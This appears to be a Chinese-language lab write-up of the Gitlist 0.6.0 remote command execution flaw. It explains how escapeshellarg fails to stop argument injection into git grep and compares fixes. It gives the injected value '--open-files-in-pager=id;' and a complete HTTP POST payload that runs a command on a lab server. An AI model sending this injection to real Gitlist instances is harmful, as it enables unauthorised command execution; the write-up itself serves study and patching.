<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs63189908{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="gitlist-060-远程命令执行漏洞"><span class="csDE05BCC">Gitlist 0.6.0 </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Gitlist 0.6.0</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="环境搭建"><span class="csD6CA00D2">环境搭建</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">执行如下命令启动漏洞环境：</span></p><p class="cs3A447A38"><span class="cs9FB05234">docker-compose up -d</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">环境启动后，访问</span><span class="cs9FB05234">http://your-ip:8080</span><span class="cs9C1B1871">将看到一个名为</span><span class="cs9FB05234">example</span><span class="cs9C1B1871">的仓库。</span></p><h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在用户对仓库中代码进行搜索的时候，</span><span class="cs8926E06">gitlist</span><span class="cs9C1B1871">将调用</span><span class="cs9FB05234">git grep</span><span class="cs9C1B1871">命令：</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function searchTree($query, $branch)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (empty($query)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$query = escapeshellarg($query);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} catch (\RuntimeException $e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中，</span><span class="cs9FB05234">$query</span><span class="cs9C1B1871">是搜索的关键字，</span><span class="cs9FB05234">$branch</span><span class="cs9C1B1871">是搜索的分支。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果用户输入的</span><span class="cs9FB05234">$query</span><span class="cs9C1B1871">的值是</span><span class="cs9FB05234">--open-files-in-pager=id;</span><span class="cs9C1B1871">，将可以执行</span><span class="cs9FB05234">id</span><span class="cs9C1B1871">命令：</span><span class="cs8926E06"><br/>1.png<br/></span><span class="cs9C1B1871">导致这个漏洞的原因，有几点：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">开发者对于</span><span class="cs9FB05234">escapeshellarg</span><span class="cs9C1B1871">函数的误解，造成参数注入</span></li><li class="cs63189908"><span class="cs9FB05234">git grep</span><span class="cs9C1B1871">的参数</span><span class="cs9FB05234">--open-files-in-pager</span><span class="cs9C1B1871">的值，将被直接执行</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">理论上，在经过</span><span class="cs9FB05234">$query = escapeshellarg($query);</span><span class="cs9C1B1871">处理后，</span><span class="cs9FB05234">$query</span><span class="cs9C1B1871">将变成一个由单引号包裹的字符串。但不出漏洞的前提是，这个字符串应该出现在</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">参数值</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">的位置，而不是出现在参数选项（</span><span class="cs8926E06">option</span><span class="cs9C1B1871">）中。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们可以试一下如下命令：</span></p><p class="cs3A447A38"><span class="cs9FB05234">git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.png<br/></span><span class="cs9C1B1871">如上图，我将</span><span class="cs9FB05234">$query</span><span class="cs9C1B1871">放在了</span><span class="cs9FB05234">-e</span><span class="cs9C1B1871">参数的值的位置，此时它就仅仅是一个字符串而已，并不会被当成参数</span><span class="cs9FB05234">--open-files-in-pager</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这应该作为本漏洞的最佳修复方法，也是</span><span class="cs8926E06">git</span><span class="cs9C1B1871">官方对</span><span class="cs8926E06">pattern</span><span class="cs9C1B1871">可能是用户输入的情况的一种解决方案（以下说明来自</span><span class="cs8926E06">man-page</span><span class="cs9C1B1871">）：</span></p><p class="cs6FD73CFB"><span class="cs8926E06">-e The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by or.</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当然，</span><span class="cs8926E06">gitlist</span><span class="cs9C1B1871">的开发者用了另一种修复方案：</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function searchTree($query, $branch)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (empty($query)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$query = escapeshellarg($query);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} catch (\RuntimeException $e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先用</span><span class="cs9FB05234">preg_replace</span><span class="cs9C1B1871">将</span><span class="cs9FB05234">-</span><span class="cs9C1B1871">开头的非法字符移除，然后将</span><span class="cs9FB05234">$query</span><span class="cs9C1B1871">放在</span><span class="cs9FB05234">--</span><span class="cs9C1B1871">的后面。在命令行解析器中，</span><span class="cs9FB05234">--</span><span class="cs9C1B1871">的意思是，此后的部分不会再包含参数选项（</span><span class="cs8926E06">option</span><span class="cs9C1B1871">）：</span></p><p class="cs6FD73CFB"><span class="cs8926E06">A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.</span></p><p class="cs6FD73CFB"><span class="cs8926E06">If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash&#39;s exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script.</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">举个简单的例子，如果我们需要查看一个文件名是</span><span class="cs9FB05234">--name</span><span class="cs9C1B1871">的文件，我们就不能用</span><span class="cs9FB05234">cat --name</span><span class="cs9C1B1871">来读取，也不能用</span><span class="cs9FB05234">cat &#39;--name&#39;</span><span class="cs9C1B1871">，而必须要用</span><span class="cs9FB05234">cat -- --name</span><span class="cs9C1B1871">。从这个例子也能看出，单引号并不是区分一个字符串是</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">参数值</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">或</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">选项</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">的标准。</span><span class="cs8926E06"><br/>3.png<br/></span><span class="cs9C1B1871">所以官方这个修复方案也是可以接受的，只不过第一步的</span><span class="cs8926E06">preg_replace</span><span class="cs9C1B1871">有点影响正常搜索功能。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">发送如下数据包：</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /example/tree/a/search HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org:8080</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 56</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">query=--open-files-in-pager=touch /tmp/success;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中，我们访问的是</span><span class="cs9FB05234">/example/tree/a/search</span><span class="cs9C1B1871">，</span><span class="cs8926E06">example</span><span class="cs9C1B1871">是项目名称，需要是目标</span><span class="cs8926E06">gitlist</span><span class="cs9C1B1871">上一个已存在的项目；</span><span class="cs8926E06">a</span><span class="cs9C1B1871">在正常情况下应该是分支的名称，也就是</span><span class="cs9FB05234">&quot;grep -i --line-number {$query} $branch&quot;</span><span class="cs9C1B1871">中的</span><span class="cs9FB05234">$branch</span><span class="cs9C1B1871">，但因为我们的</span><span class="cs9FB05234">$query</span><span class="cs9C1B1871">被当成了一个参数，所以</span><span class="cs9FB05234">$branch</span><span class="cs9C1B1871">就应该被当做搜索的关键字。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果没有搜索结果的话，我们的命令是不会被执行的，所以我用了</span><span class="cs8926E06">&ldquo;a&rdquo;</span><span class="cs9C1B1871">这个关键字，只是为了保证能搜出结果，你也可以换成其他的试试。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">数据包发送后，用</span><span class="cs9FB05234">docker-compose exec web bash</span><span class="cs9C1B1871">进入容器中，可见</span><span class="cs9FB05234">/tmp/success</span><span class="cs9C1B1871">已成功创建：</span><span class="cs8926E06"><br/>4.png</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://vulhub.org/#/environments/gitlist/0.6.0-rce/</span></p></body>
</html>
